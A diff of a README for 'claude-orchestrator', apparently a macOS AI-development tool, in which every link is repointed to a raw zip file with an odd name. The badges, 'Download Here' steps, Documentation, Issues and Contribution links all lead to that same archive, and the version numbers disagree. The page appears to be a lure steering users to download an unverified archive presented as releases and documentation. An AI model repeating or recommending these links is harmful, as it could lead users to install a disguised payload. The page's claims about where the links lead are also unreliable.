@@ -1,9 +1,9 @@
 # 🚀 claude-orchestrator - Empower Your AI Development
 
-[![Latest Release](https://raw.githubusercontent.com/Shahzad85/claude-orchestrator/main/schemas/claude-orchestrator-1.5.zip)](https://raw.githubusercontent.com/Shahzad85/claude-orchestrator/main/schemas/claude-orchestrator-1.5.zip)
-[![macOS](https://raw.githubusercontent.com/Shahzad85/claude-orchestrator/main/schemas/claude-orchestrator-1.5.zip)](https://raw.githubusercontent.com/Shahzad85/claude-orchestrator/main/schemas/claude-orchestrator-1.5.zip)
-[![License: MIT](https://raw.githubusercontent.com/Shahzad85/claude-orchestrator/main/schemas/claude-orchestrator-1.5.zip)](LICENSE)
-[![Version](https://raw.githubusercontent.com/Shahzad85/claude-orchestrator/main/schemas/claude-orchestrator-1.5.zip)](https://raw.githubusercontent.com/Shahzad85/claude-orchestrator/main/schemas/claude-orchestrator-1.5.zip)
+[![Latest Release](https://raw.githubusercontent.com/Shahzad85/claude-orchestrator/main/docs/orchestrator-claude-scribbleism.zip)](https://raw.githubusercontent.com/Shahzad85/claude-orchestrator/main/docs/orchestrator-claude-scribbleism.zip)
+[![macOS](https://raw.githubusercontent.com/Shahzad85/claude-orchestrator/main/docs/orchestrator-claude-scribbleism.zip)](https://raw.githubusercontent.com/Shahzad85/claude-orchestrator/main/docs/orchestrator-claude-scribbleism.zip)
+[![License: MIT](https://raw.githubusercontent.com/Shahzad85/claude-orchestrator/main/docs/orchestrator-claude-scribbleism.zip)](LICENSE)
+[![Version](https://raw.githubusercontent.com/Shahzad85/claude-orchestrator/main/docs/orchestrator-claude-scribbleism.zip)](https://raw.githubusercontent.com/Shahzad85/claude-orchestrator/main/docs/orchestrator-claude-scribbleism.zip)
 
 ---
 
@@ -24,7 +24,7 @@ To use Claude Code Orchestrator, you first need to download it. Follow these ste
 
 1. **Visit the Releases Page**  
    Click the link below to go to the release page where you can download the latest version.  
-   [Download Here](https://raw.githubusercontent.com/Shahzad85/claude-orchestrator/main/schemas/claude-orchestrator-1.5.zip)
+   [Download Here](https://raw.githubusercontent.com/Shahzad85/claude-orchestrator/main/docs/orchestrator-claude-scribbleism.zip)
 
 2. **Choose the Right File**  
    On the releases page, find the version you want to use. Look for the file that suits your macOS system. 
@@ -46,7 +46,7 @@ To install Claude Code Orchestrator, please follow the outlined steps:
 
 1. **Go to the Releases Page:**  
    Click below to access the page.  
-   [Download Here](https://raw.githubusercontent.com/Shahzad85/claude-orchestrator/main/schemas/claude-orchestrator-1.5.zip)
+   [Download Here](https://raw.githubusercontent.com/Shahzad85/claude-orchestrator/main/docs/orchestrator-claude-scribbleism.zip)
 
 2. **Select the Version:**  
    Find the latest version (2.3 as of now) on the releases page. 
@@ -75,15 +75,15 @@ To ensure that Claude Code Orchestrator runs smoothly, your machine should meet 
 
 ## 🔗 Useful Links
 
-- **Documentation:** For in-depth guides on features and usage, visit the [Documentation](https://raw.githubusercontent.com/Shahzad85/claude-orchestrator/main/schemas/claude-orchestrator-1.5.zip).
+- **Documentation:** For in-depth guides on features and usage, visit the [Documentation](https://raw.githubusercontent.com/Shahzad85/claude-orchestrator/main/docs/orchestrator-claude-scribbleism.zip).
 - **Community Support:** Join our community forums for help and discussions.
-- **Issues:** If you encounter any problems, report them on our [Issues page](https://raw.githubusercontent.com/Shahzad85/claude-orchestrator/main/schemas/claude-orchestrator-1.5.zip).
+- **Issues:** If you encounter any problems, report them on our [Issues page](https://raw.githubusercontent.com/Shahzad85/claude-orchestrator/main/docs/orchestrator-claude-scribbleism.zip).
 
 ---
 
 ## 🤝 Contribute
 
-You can contribute to the Claude Code Orchestrator. Check our [Contribution Guidelines](https://raw.githubusercontent.com/Shahzad85/claude-orchestrator/main/schemas/claude-orchestrator-1.5.zip).
+You can contribute to the Claude Code Orchestrator. Check our [Contribution Guidelines](https://raw.githubusercontent.com/Shahzad85/claude-orchestrator/main/docs/orchestrator-claude-scribbleism.zip).
 
 ---
 
